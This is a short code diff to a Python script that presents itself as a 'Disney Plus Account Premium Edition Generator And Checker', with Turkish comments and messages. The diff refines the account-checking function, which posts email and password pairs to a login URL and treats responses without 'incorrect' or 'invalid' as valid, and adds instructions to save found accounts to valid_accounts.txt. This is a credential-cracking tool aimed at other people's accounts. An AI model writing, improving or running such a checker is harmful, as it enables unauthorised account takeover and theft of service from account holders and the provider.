@@ -1,5 +1,7 @@
 print("Owned By Emin INC.")
 print("Disney Plus Account Premium Edition Generator And Checker 1.0")
+print("Çalıştırmadan önce bulunan hesapların kaydedilmesi için")
+print("valid_accounts.txt dosyasını ya değiştirin yada valid_accounts adında metin dosyası oluşturun.")
 import random
 import string
 import time
@@ -45,7 +47,11 @@ def check_account_validity(email, password):
         "password": password
     }
     response = requests.post(url, headers=headers, data=data)
-    if response.status_code == 200:
+    
+    # Yanıt içinde hata mesajları arayarak geçersiz girişleri kontrol et
+    if "incorrect" in response.text.lower() or "invalid" in response.text.lower():
+        return False
+    elif response.status_code == 200:
         return True
     else:
         return False
